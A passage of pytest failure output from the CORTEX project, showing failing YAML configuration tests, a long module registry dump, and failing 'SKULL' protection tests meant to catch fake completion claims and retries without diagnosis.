'scope': 'rules', 'required': True, 'params': {'valid_severities': ['safe', 'warning', 'blocked']}}, {'check': 'templates_valid', 'scope': 'challenge_template', 'required': True, 'params': {'has_placeholders': True, 'has_options': True}}]}
_____________ TestYAMLLoading.test_brain_protection_rules_content _____________
tests\test_yaml_loading.py:73: in test_brain_protection_rules_content
    for rule_id, rule in rules['rules'].items():
                         ^^^^^^^^^^^^^^
E   KeyError: 'rules'
_________________ TestYAMLLoading.test_design_metadata_phases _________________
tests\test_yaml_loading.py:276: in test_design_metadata_phases
    assert 'completion_percentage' in phase, f"Phase {phase_id} missing 'completion_percentage'"
E   AssertionError: Phase phase_6 missing 'completion_percentage'
E   assert 'completion_percentage' in {'id': 6, 'name': 'VS Code Extension', 'status': 'planned', 'weeks': '17-20', 'estimated_hours': 40}
________________ TestYAMLLoading.test_yaml_loading_performance ________________
tests\test_yaml_loading.py:341: in test_yaml_loading_performance
    assert load_time < 0.1, \
E   AssertionError: cortex-operations.yaml took 0.125s to load (limit: 0.1s)
E   assert 0.12505817413330078 < 0.1
_______________ TestYAMLLoading.test_all_yaml_files_consistent ________________
tests\test_yaml_loading.py:361: in test_all_yaml_files_consistent
    assert module_name in modules['modules'], \
E   AssertionError: Operation refresh_cortex_story references unknown module: load_story_template
E   assert 'load_story_template' in {'demo_introduction': {'name': 'Demo Introduction', 'category': 'demo', 'phase': 'preparation', 'priority': 1, 'description': 'Welcome message and demo flow explanation', 'file_path': 'src/operations/modules/demo_introduction_module.py', 'class_name': 'DemoIntroductionModule', 'dependencies': [], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-08', 'estimated_hours': 1.0, 'actual_hours': 0.8, 'test_coverage': 95, 'notes': 'Windows Track A - First module implemented'}, 'demo_help_system': {'name': 'Demo Help System', 'category': 'demo', 'phase': 'preparation', 'priority': 2, 'description': 'Demonstrate help command capabilities', 'file_path': 'src/operations/modules/demo_help_system_module.py', 'class_name': 'DemoHelpSystemModule', 'dependencies': ['demo_introduction'], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-08', 'estimated_hours': 1.5, 'actual_hours': 1.2, 'test_coverage': 90, 'notes': 'Windows Track A - Uses response templates'}, 'demo_story_refresh': {'name': 'Demo Story Refresh', 'category': 'demo', 'phase': 'execution', 'priority': 3, 'description': 'Show story transformation in action', 'file_path': 'src/operations/modules/demo_story_refresh_module.py', 'class_name': 'DemoStoryRefreshModule', 'dependencies': ['demo_introduction', 'demo_help_system'], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-09', 'estimated_hours': 2.0, 'actual_hours': 1.8, 'test_coverage': 92, 'notes': 'Mac Track B - Narrator voice integration'}, 'demo_cleanup': {'name': 'Demo Cleanup', 'category': 'demo', 'phase': 'execution', 'priority': 4, 'description': 'Demonstrate cleanup operation', 'file_path': 'src/operations/modules/demo_cleanup_module.py', 'class_name': 'DemoCleanupModule', 'dependencies': ['demo_introduction', 'demo_help_system'], 'optional': True, 'status': 'ready', 'implementation_date': '2025-11-08', 'estimated_hours': 1.5, 'actual_hours': 1.3, 'test_coverage': 88, 'notes': 'Windows Track A - Shows maintenance capabilities'}, 'demo_conversation': {'name': 'Demo Conversation', 'category': 'demo', 'phase': 'execution', 'priority': 5, 'description': 'Demonstrate conversation memory', 'file_path': 'src/operations/modules/demo_conversation_module.py', 'class_name': 'DemoConversationModule', 'dependencies': ['demo_introduction'], 'optional': True, 'status': 'ready', 'implementation_date': '2025-11-09', 'estimated_hours': 2.0, 'actual_hours': 2.1, 'test_coverage': 85, 'notes': 'Mac Track B - Shows Tier 1 memory'}, 'demo_completion': {'name': 'Demo Completion', 'category': 'demo', 'phase': 'completion', 'priority': 6, 'description': 'Summary and next steps', 'file_path': 'src/operations/modules/demo_completion_module.py', 'class_name': 'DemoCompletionModule', 'dependencies': ['demo_introduction'], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-09', 'estimated_hours': 1.0, 'actual_hours': 0.9, 'test_coverage': 93, 'notes': 'Mac Track B - Final demo module'}, 'project_validation': {'name': 'Project Validation', 'category': 'setup', 'phase': 'preparation', 'priority': 1, 'description': 'Validate CORTEX project structure', 'file_path': 'src/operations/modules/project_validation_module.py', 'class_name': 'ProjectValidationModule', 'dependencies': [], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-07', 'estimated_hours': 2.0, 'actual_hours': 1.8, 'test_coverage': 94, 'notes': 'Foundation module - validates brain structure'}, 'platform_detection': {'name': 'Platform Detection', 'category': 'setup', 'phase': 'preparation', 'priority': 2, 'description': 'Detect OS and configure platform-specific settings', 'file_path': 'src/operations/modules/platform_detection_module.py', 'class_name': 'PlatformDetectionModule', 'dependencies': ['project_validation'], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-07', 'estimated_hours': 2.5, 'actual_hours': 2.3, 'test_coverage': 96, 'notes': 'Supports Mac, Windows, Linux'}, 'git_sync': {'name': 'Git Repository Synchronization', 'category': 'setup', 'phase': 'environment', 'priority': 15, 'description': 'Sync project with remote git repository', 'file_path': 'src/operations/modules/git_sync_module.py', 'class_name': 'GitSyncModule', 'dependencies': ['platform_detection'], 'optional': True, 'status': 'ready', 'implementation_date': '2025-11-07', 'estimated_hours': 3.0, 'actual_hours': 2.8, 'test_coverage': 89, 'notes': 'Handles offline scenarios gracefully'}, 'virtual_environment': {'name': 'Virtual Environment Setup', 'category': 'setup', 'phase': 'environment', 'priority': 20, 'description': 'Create and configure Python virtual environment', 'file_path': 'src/operations/modules/virtual_environment_module.py', 'class_name': 'VirtualEnvironmentModule', 'dependencies': ['platform_detection'], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-07', 'estimated_hours': 2.5, 'actual_hours': 2.4, 'test_coverage': 91, 'notes': 'Cross-platform venv handling'}, 'python_dependencies': {'name': 'Python Dependencies Installation', 'category': 'setup', 'phase': 'environment', 'priority': 25, 'description': 'Install required Python packages', 'file_path': 'src/operations/modules/python_dependencies_module.py', 'class_name': 'PythonDependenciesModule', 'dependencies': ['virtual_environment'], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-07', 'estimated_hours': 2.0, 'actual_hours': 2.2, 'test_coverage': 87, 'notes': 'Handles requirements.txt and extras'}, 'vision_api': {'name': 'Vision API Configuration', 'category': 'setup', 'phase': 'environment', 'priority': 30, 'description': 'Configure Google Cloud Vision API', 'file_path': 'src/operations/modules/vision_api_module.py', 'class_name': 'VisionAPIModule', 'dependencies': ['python_dependencies'], 'optional': True, 'status': 'ready', 'implementation_date': '2025-11-07', 'estimated_hours': 3.5, 'actual_hours': 3.8, 'test_coverage': 83, 'notes': 'Optional feature - handles missing credentials'}, 'conversation_tracking': {'name': 'Conversation Tracking Setup', 'category': 'setup', 'phase': 'environment', 'priority': 35, 'description': 'Configure conversation capture daemon', 'file_path': 'src/operations/modules/conversation_tracking_module.py', 'class_name': 'ConversationTrackingModule', 'dependencies': ['python_dependencies'], 'optional': True, 'status': 'pending', 'estimated_hours': 3.0, 'notes': 'Tier 1 memory enablement'}, 'brain_initialization': {'name': 'Brain Initialization', 'category': 'setup', 'phase': 'validation', 'priority': 40, 'description': 'Initialize CORTEX brain tiers', 'file_path': 'src/operations/modules/brain_initialization_module.py', 'class_name': 'BrainInitializationModule', 'dependencies': ['python_dependencies'], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-07', 'estimated_hours': 4.0, 'actual_hours': 4.2, 'test_coverage': 92, 'notes': 'Tier 0, 1, 2, 3 setup'}, 'brain_tests': {'name': 'Brain Tests Execution', 'category': 'setup', 'phase': 'verification', 'priority': 45, 'description': 'Run brain integrity tests', 'file_path': 'src/operations/modules/brain_tests_module.py', 'class_name': 'BrainTestsModule', 'dependencies': ['brain_initialization'], 'optional': True, 'status': 'ready', 'implementation_date': '2025-11-07', 'estimated_hours': 2.0, 'actual_hours': 1.9, 'test_coverage': 90, 'notes': 'Validates all brain tiers'}, 'tooling_verification': {'name': 'Tooling Verification', 'category': 'setup', 'phase': 'verification', 'priority': 50, 'description': 'Verify required tools are available', 'file_path': 'src/operations/modules/tooling_verification_module.py', 'class_name': 'ToolingVerificationModule', 'dependencies': ['platform_detection'], 'optional': True, 'status': 'pending', 'estimated_hours': 2.5, 'notes': 'Check git, python, npm, etc.'}, 'setup_completion': {'name': 'Setup Completion', 'category': 'setup', 'phase': 'completion', 'priority': 100, 'description': 'Finalize setup and provide summary', 'file_path': 'src/operations/modules/setup_completion_module.py', 'class_name': 'SetupCompletionModule', 'dependencies': ['brain_initialization'], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-07', 'estimated_hours': 1.0, 'actual_hours': 0.8, 'test_coverage': 95, 'notes': 'Final setup module'}, 'scan_temporary_files': {'name': 'Scan Temporary Files', 'category': 'cleanup', 'phase': 'preparation', 'priority': 1, 'description': 'Identify temporary files for removal', 'file_path': 'src/operations/modules/scan_temporary_files_module.py', 'class_name': 'ScanTemporaryFilesModule', 'dependencies': [], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-08', 'estimated_hours': 2.5, 'actual_hours': 2.3, 'test_coverage': 88, 'notes': 'Safe mode with dry-run option'}, 'remove_old_logs': {'name': 'Remove Old Logs', 'category': 'cleanup', 'phase': 'execution', 'priority': 10, 'description': 'Clean up old log files', 'file_path': 'src/operations/modules/remove_old_logs_module.py', 'class_name': 'RemoveOldLogsModule', 'dependencies': ['scan_temporary_files'], 'optional': True, 'status': 'ready', 'implementation_date': '2025-11-08', 'estimated_hours': 1.5, 'actual_hours': 1.4, 'test_coverage': 85, 'notes': 'Preserves recent logs'}, 'clear_python_cache': {'name': 'Clear Python Cache', 'category': 'cleanup', 'phase': 'execution', 'priority': 15, 'description': 'Remove __pycache__ directories', 'file_path': 'src/operations/modules/clear_python_cache_module.py', 'class_name': 'ClearPythonCacheModule', 'dependencies': [], 'optional': True, 'status': 'ready', 'implementation_date': '2025-11-08', 'estimated_hours': 1.0, 'actual_hours': 0.9, 'test_coverage': 90, 'notes': 'Quick cache cleanup'}, 'vacuum_sqlite_databases': {'name': 'Vacuum SQLite Databases', 'category': 'cleanup', 'phase': 'execution', 'priority': 20, 'description': 'Optimize SQLite database files', 'file_path': 'src/operations/modules/vacuum_sqlite_databases_module.py', 'class_name': 'VacuumSQLiteDatabasesModule', 'dependencies': [], 'optional': True, 'status': 'ready', 'implementation_date': '2025-11-08', 'estimated_hours': 2.0, 'actual_hours': 1.8, 'test_coverage': 87, 'notes': 'Reduces brain database size'}, 'remove_orphaned_files': {'name': 'Remove Orphaned Files', 'category': 'cleanup', 'phase': 'execution', 'priority': 25, 'description': 'Clean up orphaned temporary files', 'file_path': 'src/operations/modules/remove_orphaned_files_module.py', 'class_name': 'RemoveOrphanedFilesModule', 'dependencies': ['scan_temporary_files'], 'optional': True, 'status': 'pending', 'estimated_hours': 2.0, 'notes': 'Safety checks required'}, 'compress_old_files': {'name': 'Compress Old Files', 'category': 'cleanup', 'phase': 'execution', 'priority': 30, 'description': 'Compress large old files', 'file_path': 'src/operations/modules/compress_old_files_module.py', 'class_name': 'CompressOldFilesModule', 'dependencies': [], 'optional': True, 'status': 'pending', 'estimated_hours': 2.5, 'notes': 'Archive old conversations'}, 'validate_cleanup_safety': {'name': 'Validate Cleanup Safety', 'category': 'cleanup', 'phase': 'verification', 'priority': 50, 'description': "Ensure cleanup didn't break anything", 'file_path': 'src/operations/modules/validate_cleanup_safety_module.py', 'class_name': 'ValidateCleanupSafetyModule', 'dependencies': [], 'optional': True, 'status': 'pending', 'estimated_hours': 2.0, 'notes': 'Post-cleanup validation'}, 'generate_cleanup_report': {'name': 'Generate Cleanup Report', 'category': 'cleanup', 'phase': 'completion', 'priority': 100, 'description': 'Create cleanup summary report', 'file_path': 'src/operations/modules/generate_cleanup_report_module.py', 'class_name': 'GenerateCleanupReportModule', 'dependencies': [], 'optional': False, 'status': 'pending', 'estimated_hours': 1.5, 'notes': 'Show space saved and actions taken'}, 'load_story_source': {'name': 'Load Story Source', 'category': 'story', 'phase': 'preparation', 'priority': 1, 'description': 'Load original CORTEX story markdown', 'file_path': 'src/operations/modules/load_story_source_module.py', 'class_name': 'LoadStorySourceModule', 'dependencies': [], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-09', 'estimated_hours': 1.5, 'actual_hours': 1.3, 'test_coverage': 92, 'notes': 'Validates story structure'}, 'validate_story_structure': {'name': 'Validate Story Structure', 'category': 'story', 'phase': 'validation', 'priority': 5, 'description': 'Ensure story meets structural requirements', 'file_path': 'src/operations/modules/validate_story_structure_module.py', 'class_name': 'ValidateStoryStructureModule', 'dependencies': ['load_story_source'], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-09', 'estimated_hours': 2.0, 'actual_hours': 2.1, 'test_coverage': 89, 'notes': 'Part structure validation'}, 'apply_narrator_voice': {'name': 'Apply Narrator Voice', 'category': 'story', 'phase': 'execution', 'priority': 10, 'description': 'Transform story with narrator voice', 'file_path': 'src/operations/modules/apply_narrator_voice_module.py', 'class_name': 'ApplyNarratorVoiceModule', 'dependencies': ['validate_story_structure'], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-09', 'estimated_hours': 4.0, 'actual_hours': 4.3, 'test_coverage': 86, 'notes': 'Core story transformation logic'}, 'story_length_manager': {'name': 'Story Length Manager', 'category': 'story', 'phase': 'execution', 'priority': 15, 'description': 'Manage story length and token optimization', 'file_path': 'src/operations/modules/story_length_manager_module.py', 'class_name': 'StoryLengthManagerModule', 'dependencies': ['apply_narrator_voice'], 'optional': True, 'status': 'ready', 'implementation_date': '2025-11-09', 'estimated_hours': 3.0, 'actual_hours': 3.2, 'test_coverage': 84, 'notes': 'Part detection and trimming'}, 'build_story_preview': {'name': 'Build Story Preview', 'category': 'story', 'phase': 'execution', 'priority': 20, 'description': 'Generate HTML preview of transformed story', 'file_path': 'src/operations/modules/build_story_preview_module.py', 'class_name': 'BuildStoryPreviewModule', 'dependencies': ['apply_narrator_voice'], 'optional': True, 'status': 'ready', 'implementation_date': '2025-11-09', 'estimated_hours': 2.5, 'actual_hours': 2.4, 'test_coverage': 81, 'notes': 'Visual story validation'}, 'deploy_docs_preview': {'name': 'Deploy Docs Preview', 'category': 'story', 'phase': 'execution', 'priority': 25, 'description': 'Deploy story preview to docs site', 'file_path': 'src/operations/modules/deploy_docs_preview_module.py', 'class_name': 'DeployDocsPreviewModule', 'dependencies': ['build_story_preview'], 'optional': True, 'status': 'pending', 'estimated_hours': 2.0, 'notes': 'GitHub Pages integration'}, 'update_story_docs': {'name': 'Update Story Documentation', 'category': 'story', 'phase': 'execution', 'priority': 30, 'description': 'Update story in documentation site', 'file_path': 'src/operations/modules/update_story_docs_module.py', 'class_name': 'UpdateStoryDocsModule', 'dependencies': ['apply_narrator_voice'], 'optional': True, 'status': 'pending', 'estimated_hours': 1.5, 'notes': 'MkDocs integration'}, 'story_refresh_completion': {'name': 'Story Refresh Completion', 'category': 'story', 'phase': 'completion', 'priority': 100, 'description': 'Finalize story refresh with summary', 'file_path': 'src/operations/modules/story_refresh_completion_module.py', 'class_name': 'StoryRefreshCompletionModule', 'dependencies': ['apply_narrator_voice'], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-09', 'estimated_hours': 1.0, 'actual_hours': 0.9, 'test_coverage': 93, 'notes': 'Final story refresh module'}, 'scan_docstrings': {'name': 'Scan Docstrings', 'category': 'documentation', 'phase': 'preparation', 'priority': 1, 'description': 'Extract docstrings from source code', 'file_path': 'src/operations/modules/scan_docstrings_module.py', 'class_name': 'ScanDocstringsModule', 'dependencies': [], 'optional': False, 'status': 'pending', 'estimated_hours': 3.0, 'notes': 'Parse Python docstrings'}, 'generate_api_docs': {'name': 'Generate API Documentation', 'category': 'documentation', 'phase': 'execution', 'priority': 10, 'description': 'Generate API reference documentation', 'file_path': 'src/operations/modules/generate_api_docs_module.py', 'class_name': 'GenerateAPIDocsModule', 'dependencies': ['scan_docstrings'], 'optional': False, 'status': 'pending', 'estimated_hours': 4.0, 'notes': 'Sphinx or MkDocs autodoc'}, 'build_mkdocs_site': {'name': 'Build MkDocs Site', 'category': 'documentation', 'phase': 'execution', 'priority': 15, 'description': 'Build complete documentation site', 'file_path': 'src/operations/modules/build_mkdocs_site_module.py', 'class_name': 'BuildMkDocsModule', 'dependencies': [], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-08', 'estimated_hours': 2.5, 'actual_hours': 2.3, 'test_coverage': 87, 'notes': 'MkDocs build integration'}, 'update_mkdocs_index': {'name': 'Update MkDocs Index', 'category': 'documentation', 'phase': 'execution', 'priority': 20, 'description': 'Update documentation index', 'file_path': 'src/operations/modules/update_mkdocs_index_module.py', 'class_name': 'UpdateMkDocsIndexModule', 'dependencies': ['build_mkdocs_site'], 'optional': True, 'status': 'ready', 'implementation_date': '2025-11-08', 'estimated_hours': 1.5, 'actual_hours': 1.4, 'test_coverage': 85, 'notes': 'Navigation structure'}, 'validate_doc_links': {'name': 'Validate Documentation Links', 'category': 'documentation', 'phase': 'verification', 'priority': 30, 'description': 'Check for broken links in docs', 'file_path': 'src/operations/modules/validate_doc_links_module.py', 'class_name': 'ValidateDocLinksModule', 'dependencies': ['build_mkdocs_site'], 'optional': True, 'status': 'ready', 'implementation_date': '2025-11-08', 'estimated_hours': 2.0, 'actual_hours': 1.9, 'test_coverage': 82, 'notes': 'Link checker integration'}, 'refresh_design_docs': {'name': 'Refresh Design Documentation', 'category': 'documentation', 'phase': 'execution', 'priority': 25, 'description': 'Update design documentation files', 'file_path': 'src/operations/modules/refresh_design_docs_module.py', 'class_name': 'RefreshDesignDocsModule', 'dependencies': [], 'optional': True, 'status': 'pending', 'estimated_hours': 2.5, 'notes': 'CORTEX 2.0 design docs'}, 'generate_diagrams': {'name': 'Generate Diagrams', 'category': 'documentation', 'phase': 'execution', 'priority': 35, 'description': 'Generate architecture diagrams', 'file_path': 'src/operations/modules/generate_diagrams_module.py', 'class_name': 'GenerateDiagramsModule', 'dependencies': [], 'optional': True, 'status': 'pending', 'estimated_hours': 3.5, 'notes': 'Mermaid or PlantUML'}, 'update_changelog': {'name': 'Update Changelog', 'category': 'documentation', 'phase': 'execution', 'priority': 40, 'description': 'Update CHANGELOG.md', 'file_path': 'src/operations/modules/update_changelog_module.py', 'class_name': 'UpdateChangelogModule', 'dependencies': [], 'optional': True, 'status': 'pending', 'estimated_hours': 1.5, 'notes': 'Conventional commits'}, 'deploy_docs_site': {'name': 'Deploy Documentation Site', 'category': 'documentation', 'phase': 'execution', 'priority': 50, 'description': 'Deploy docs to GitHub Pages', 'file_path': 'src/operations/modules/deploy_docs_site_module.py', 'class_name': 'DeployDocsSiteModule', 'dependencies': ['build_mkdocs_site'], 'optional': True, 'status': 'pending', 'estimated_hours': 2.0, 'notes': 'GitHub Actions integration'}, 'docs_completion': {'name': 'Documentation Completion', 'category': 'documentation', 'phase': 'completion', 'priority': 100, 'description': 'Finalize documentation with summary', 'file_path': 'src/operations/modules/docs_completion_module.py', 'class_name': 'DocsCompletionModule', 'dependencies': [], 'optional': False, 'status': 'pending', 'estimated_hours': 1.0, 'notes': 'Final docs module'}}
_______________ TestYAMLTokenOptimization.test_yaml_file_sizes ________________
tests\test_yaml_loading.py:404: in test_yaml_file_sizes
    assert file_size < max_bytes, \
E   AssertionError: brain-protection-rules.yaml is 66561 bytes (limit: 10000)
E   assert 66561 < 10000
__________________ TestEntryPointBloat.test_line_count_limit __________________
tests\tier0\test_entry_point_bloat.py:100: in test_line_count_limit
    assert lines <= MAX_LINES, (
E   AssertionError: Entry point has 589 lines (MAX: 500). Consider modularizing large sections.
E   assert 589 <= 500
_ TestSkull003VisualRegression.test_detects_visual_test_patterns[test_playwright_screenshot] _
tests\tier0\test_skull_comprehensive.py:229: in test_detects_visual_test_patterns
    assert validation.passed, f"Should recognize: {test_name}"
E   AssertionError: Should recognize: test_playwright_screenshot
E   assert False
E    +  where False = SkullValidation(passed=False, rule_id=<SkullRuleId.VISUAL_REGRESSION: 'SKULL-003'>, rule_name='Visual Regression', message='SKULL-003 VIOLATION: No visual validation for UI update. CSS/UI changes require visual regression test or computed style verification.', enforcement=<EnforcementLevel.WARNING: 'WARNING'>, tests_required=['Visual regression test or computed style check'], tests_found=['test_playwright_screenshot']).passed
------------------------------ Captured log call ------------------------------
INFO     cortex.skull:skull_protector.py:107 [SKULL] Validating fix: UI update
_______ TestSkull004RetryWithoutLearning.test_requires_changed_approach _______
tests\tier0\test_skull_comprehensive.py:284: in test_requires_changed_approach
    assert not validation.passed
E   AssertionError: assert not True
E    +  where True = SkullValidation(passed=True, rule_id=None, rule_name='All Rules', message='All SKULL protection checks passed', enforcement=<EnforcementLevel.INFO: 'INFO'>, tests_required=[], tests_found=['test_same_test']).passed
------------------------------ Captured log call ------------------------------
INFO     cortex.skull:skull_protector.py:107 [SKULL] Validating fix: Retry with same approach
INFO     cortex.skull:skull_protector.py:133 [SKULL] Validation passed: Retry with same approach
_ TestSkull005TransformationVerification.test_blocks_transformation_claim_without_changes _
tests\tier0\test_skull_comprehensive.py:308: in test_blocks_transformation_claim_without_changes
    assert not validation.passed
E   AssertionError: assert not True
E    +  where True = SkullValidation(passed=True, rule_id=None, rule_name='All Rules', message='All SKULL protection checks passed', enforcement=<EnforcementLevel.INFO: 'INFO'>, tests_required=[], tests_found=['test_operation_runs']).passed
------------------------------ Captured log call ------------------------------
INFO     cortex.skull:skull_protector.py:107 [SKULL] Validating fix: Transformation complete \u2705\nINFO     cortex.skull:skull_protector.py:133 [SKULL] Validation passed: Transformation complete \u2705
_ TestSkull005TransformationVerification.test_detects_pass_through_operations _
tests\tier0\test_skull_comprehensive.py:360: in test_detects_pass_through_operations
    assert not validation.passed
E   AssertionError: assert not True
E    +  where True = SkullValidation(passed=True, rule_id=None, rule_name='All Rules', message='All SKULL protection checks passed', enforcement=<EnforcementLevel.INFO: 'INFO'>, tests_required=[], tests_found=['test_runs']).passed
------------------------------ Captured log call ------------------------------
INFO     cortex.skull:skull_protector.py:107 [SKULL] Validating fix: Applied transformation \u2705\nINFO     cortex.skull:skull_protector.py:133 [SKULL] Validation passed: Applied transformation \u2705
_ TestRealWorldIncidentPrevention.test_prevents_november_10th_story_refresh_incident _
tests\tier0\test_skull_comprehensive.py:451: in test_prevents_november_10th_story_refresh_incident
    assert not validation.passed, "SKULL should detect fake transformation"
E   AssertionError: SKULL should detect fake transformation
E   assert not True
E    +  where True = SkullValidation(passed=True, rule_id=None, rule_name='All Rules', message='All SKULL protection checks passed', enforcement=<EnforcementLevel.INFO: 'INFO'>, tests_required=[], tests_found=['test_operation_runs']).passed
------------------------------ Captured log call ------------------------------
INFO     cortex.skull:skull_protector.py:107 [SKULL] Validating fix: Story refresh transformation complete \u2705\nINFO     cortex.skull:skull_protector.py:133 [SKULL] Validation passed: Story refresh transformation complete \u2705
______ TestMultipleViolations.test_css_retry_without_tests_or_diagnosis _______
tests\tier0\test_skull_comprehensive.py:480: in test_css_retry_without_tests_or_diagnosis
    assert validation.enforcement == EnforcementLevel.BLOCKING
E   AssertionError: assert <EnforcementLevel.WARNING: 'WARNING'> == <EnforcementLevel.BLOCKING: 'BLOCKING'>
E    +  where <EnforcementLevel.WARNING: 'WARNING'> = SkullValidation(passed=False, rule_id=<SkullRuleId.RETRY_WITHOUT_LEARNING: 'SKULL-004'>, rule_name='Retry Without Learning', message='SKULL-004 VIOLATION: Retry without diagnosis for Retry CSS fix (attempt 3). Must diagnose WHY previous fix failed before retrying.', enforcement=<EnforcementLevel.WARNING: 'WARNING'>, tests_required=['Root cause diagnosis'], tests_found=[]).enforcement
E    +  and   <EnforcementLevel.BLOCKING: 'BLOCKING'> = EnforcementLevel.BLOCKING
------------------------------ Captured log call ------------------------------
INFO     cortex.skull:skull_protector.py:107 [SKULL] Validating fix: Retry CSS fix (attempt 3)
______________ TestEnforcementBehavior.test_safe_passes_through _______________
tests\tier0\test_skull_comprehensive.py:548: in test_safe_passes_through
    assert validation.enforcement == EnforcementLevel.SAFE
                                     ^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'EnforcementLevel' has no attribute 'SAFE'
------------------------------ Captured log call ------------------------------
INFO     cortex.skull:skull_protector.py:107 [SKULL] Validating fix: Fixed bug \u2705 (Verified)\nINFO     cortex.skull:skull_protector.py:133 [SKULL] Validation passed: Fixed bug \u2705 (Verified)
__ TestSkullResponseTemplateIntegration.test_help_command_shows_skull_banner __
tests\tier0\test_skull_comprehensive.py:574: in test_help_command_shows_skull_banner
    assert "\u2588\u2588" in content or "\u2554" in content, "Should include ASCII art"
E   AssertionError: Should include ASCII art
E   assert ('\u2588\u2588' in '![CORTEX Commands](file:///d:/PROJECTS/CORTEX/docs/images/cortex-help-banner.png)\n\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  CORTEX COMMANDS\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n\U0001f4dd **Your Request:** {{user_request}}\n\n\U0001f3af **Understanding:** You want to see all available CORTEX commands\n\n\U0001f4ac **Response:** Here\'s your command reference:\n\nStatus  Command        What It Does\n--------------------------------------------------------------------------------\n\u2705      update story   Refresh CORTEX story documentation\n\U0001f504      setup          Setup/configure environment\n\u2705      design sync    Synchronize design with implementation\n\U0001f504      cleanup        Clean temporary files\n\u23f8\ufe0f      build docs     Generate documentation\n\u23f8\ufe0f      check brain    Validate brain protection\n\u23f8\ufe0f      run tests      Execute test suite\n\U0001f3af      plan this      Interactive planning (CORTEX 2.1)\n--------------------------------------------------------------------------------\n\nLegend:\n  \u2705 ready    - Fully working\n  \U0001f504 partial  - Core working, some modules pending\n  \u23f8\ufe0f pending  - Architecture ready, implementation pending\n  \U0001f3af planned  - Design phase (CORTEX 2.1+)\n\nUsage:\n  Natural language:  "setup environment" or "refresh story" or "sync design"\n  Slash commands:    /setup or /CORTEX, refresh cortex story\n\n\ufffd **Next Steps:**\n  \u2022 Try: "help detailed" for more information\n  \u2022 Try: "help <command>" for specific command help\n  \u2022 Try: "setup environment" to get started\n\n\xa9 2024-2025 Asif Hussain \u2502 Proprietary \u2502 github.com/asifhussain60/CORTEX\n\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n' or '\u2554' in '![CORTEX Commands](file:///d:/PROJECTS/CORTEX/docs/images/cortex-help-banner.png)\n\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  CORTEX COMMANDS\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n\U0001f4dd **Your Request:** {{user_request}}\n\n\U0001f3af **Understanding:** You want to see all available CORTEX commands\n\n\U0001f4ac **Response:** Here\'s your command reference:\n\nStatus  Command        What It Does\n--------------------------------------------------------------------------------\n\u2705      update story   Refresh CORTEX story documentation\n\U0001f504      setup          Setup/configure environment\n\u2705      design sync    Synchronize design with implementation\n\U0001f504      cleanup        Clean temporary files\n\u23f8\ufe0f      build docs     Generate documentation\n\u23f8\ufe0f      check brain    Validate brain 